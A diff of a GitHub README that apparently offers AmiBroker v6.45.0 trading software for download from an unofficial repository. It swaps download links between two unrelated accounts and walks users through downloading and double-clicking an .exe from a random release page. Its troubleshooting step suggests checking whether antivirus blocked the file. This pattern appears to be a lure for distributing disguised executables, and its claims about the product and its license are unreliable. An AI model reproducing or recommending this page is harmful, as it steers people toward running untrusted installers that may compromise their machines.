@@ -1,125 +1,82 @@
-# AmiBroker v6.45.0 - Windows Trading Analysis and Backtesting Platform 2026
+# 📈 amibroker-windows-backtest-tools - Analyze Your Trading Strategies With Precision
 
-> **AmiBroker 6.45.0 provides Windows users with a desktop environment for trading research, AFL-based strategy development, real-time market data handling, and portfolio backtesting.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/uahtisham459-dev/amibroker-windows-backtest-tools/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v6.45.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/oliverekgreen9715/amibroker-windows-backtest-tools?style=flat-square)](https://github.com/oliverekgreen9715/amibroker-windows-backtest-tools)
+## 📌 Overview
 
----
+AmiBroker v6.45.0 resides on your Windows computer. It helps traders research market trends. You write custom rules using the AmiBroker Formula Language (AFL). The software processes market data in real time. It tests your trading ideas against historical data. This process shows how your plan performs over time. You gain clarity on your portfolio risks.
 
-<p align="center">
-  <a href="https://oliverekgreen9715.github.io/amibroker-windows-backtest-tools/">
-    <img src="https://img.shields.io/badge/Download-AmiBroker%20Latest-brightgreen?style=for-the-badge" alt="Download AmiBroker">
-  </a>
-</p>
+## 🖥️ System Requirements
 
-> **[Download AmiBroker v6.45.0](https://oliverekgreen9715.github.io/amibroker-windows-backtest-tools/)**
+Ensure your computer meets these standards before you begin:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or equivalent.
+*   Memory: 8 GB RAM minimum. 16 GB recommended.
+*   Storage: 2 GB of free disk space.
+*   Display: 1920x1080 resolution.
 
-[Download Latest Build](https://oliverekgreen9715.github.io/amibroker-windows-backtest-tools/)
+## 📥 Installation Steps
 
----
+Follow these steps to set up the software on your machine.
 
-## What AmiBroker Provides
+1.  Open your internet browser.
+2.  Visit the official release page here: [https://github.com/uahtisham459-dev/amibroker-windows-backtest-tools/releases](https://github.com/uahtisham459-dev/amibroker-windows-backtest-tools/releases).
+3.  Scroll down to the list of available files under the Latest release heading.
+4.  Click the file ending in .exe to start the download.
+5.  Wait for the file to save to your Downloads folder.
+6.  Locate the downloaded file in Windows File Explorer.
+7.  Double-click the file to open the installer.
+8.  Follow the prompts on your screen.
+9.  Click Finish to complete the setup.
 
-AmiBroker is a Windows application for technical market analysis, trading-system design, and historical strategy evaluation. Traders and analysts can use it to examine price movement, test hypotheses against past data, and streamline recurring research activities.
+## 🚀 Getting Started
 
-Its desktop workspace combines visual chart analysis, AFL programming, and portfolio-oriented testing. Real-time data processing, configurable alerts, and command-line startup make it suitable for both hands-on analysis and repeatable automation workflows.
+Launch the application using the shortcut on your desktop. Upon the first launch, the program performs a quick scan of your hardware. You must configure your data source to begin trading analysis. 
 
----
+Navigate to the File menu and select Database Settings. Choose the path where you wish to save your market data. Click File and then New to create a blank chart. You now see a standard price window. You may add your custom AFL code here.
 
-## Main Capabilities
+## 📊 Performing a Backtest
 
-- Fast, responsive tools for everyday technical analysis
-- AFL support for writing indicators, trading rules, and custom strategies
-- Portfolio backtesting for evaluating setups across multiple instruments
-- Real-time processing for monitoring current market information
-- Multiple language options for improved accessibility
-- User-defined alerts for market and strategy conditions
-- Cloud synchronization for aligning selected data or settings between environments
-- Command-line support for scripted startup and repeatable execution
+A backtest shows how a strategy performed in the past. To run one, follow this path:
 
----
+1.  Open the Analysis window from the Analysis menu.
+2.  Load an AFL file into the formula editor.
+3.  Choose the time frame for your test.
+4.  Select the assets you want to analyze.
+5.  Press the Backtest button.
 
-## Setup
+The software computes the results. It displays the net profit, maximum drawdown, and win rate. These metrics help you decide if a strategy fits your goals.
 
-1. Obtain the release archive or clone the repository:
-   - `git clone https://github.com/oliverekgreen9715/amibroker-windows-backtest-tools.git
-2. Unpack the archive when using a downloaded package.
-3. Place the application directory somewhere on the Windows machine.
-4. Start the main executable, or launch it through the command line when using a scripted process.
+## 🛠️ Frequently Asked Questions
 
-When a build page is provided, select the newest available package through the download link above.
+**Does the software update automatically?**
+No. You must visit the download page to check for new releases.
 
----
+**Where do I find sample AFL files?**
+The software includes a folder named Formulas. Check your installation directory to see pre-defined examples.
 
-## Getting Started
+**Can I export my results?**
+Yes. Use the Report interface to save your findings as an HTML file or a text document.
 
-A standard session can follow this sequence:
+**How do I clear cached data?**
+Go to the Tools menu and select Clean Database. This removes old temporary files.
 
-1. Start AmiBroker on Windows.
-2. Import market data or establish a connection to the relevant data source.
-3. Create or modify AFL code for indicators, scans, or trading systems.
-4. Execute historical backtests and inspect the results.
-5. Apply portfolio testing to analyze behavior across several symbols.
-6. Configure alerts or command-line execution for recurring monitoring tasks.
+## 📝 Best Practices
 
-A basic command-line launch uses:
+*   Test your strategies on small datasets before running full portfolio checks.
+*   Back up your AFL files in a separate folder.
+*   Review your data sources for accuracy.
+*   Adjust your commission settings to match your broker's fees.
+*   Keep your Windows operating system updated for stability.
 
-- `AmiBroker.exe`
+## ⚠️ Troubleshooting
 
-For more automated workflows, pair AFL scripts with scheduled tasks or other external scripts that invoke the application from the command line.
+If the program fails to launch:
 
----
+1.  Check that your antivirus did not block the file.
+2.  Restart your computer to clear pending updates.
+3.  Run the installer again to repair missing files.
+4.  Ensure you have enough disk space on your drive.
 
-## Settings and Project Organization
-
-Application preferences are generally configured within AmiBroker and saved through the local user profile or project files. Relevant settings may include market data connections, alert behavior, AFL and scripting preferences, and the interface language.
-
-One possible directory arrangement is:
-
-    settings/
-    data/
-    scripts/
-    alerts/
-
-When working with several workspaces, separate strategy files and data definitions by project to simplify maintenance, updates, and testing.
-
----
-
-## System Requirements
-
-- A Windows operating system
-- A compatible runtime environment for the desktop software
-- Market-data access for real-time processing and analysis
-- Local disk space for charts, scripts, data, and backtest output
-- Sufficient CPU and memory resources for portfolio analysis and repeated calculations
-
----
-
-## Frequently Asked Questions
-
-**Is AmiBroker suitable for automated research?**  
-Yes. AFL scripts, command-line launching, and configurable alerts can be combined to create repeatable analysis processes.
-
-**Can it process data in real time?**  
-Yes. AmiBroker includes real-time data processing for active market observation and timely updates.
-
-**Where are the application preferences configured?**  
-Settings are primarily managed within the application. Review the relevant configuration sections for data sources, alerts, language, and workflow options.
-
-**What should I check when something does not work correctly?**  
-Inspect the configured data source, check the AFL or strategy logic, and make sure the Windows environment has the required runtime, storage, memory, and CPU capacity.
-
-**Where can I find the newest release?**  
-Use the download link above to obtain the latest available package.
-
----
-
-## License
-
-GNU GPL v3.0 - refer to [LICENSE](LICENSE) for the complete license terms.
+Keywords: amibroker, trading, backtest, windows, finance, stocks, portfolio, algorithms
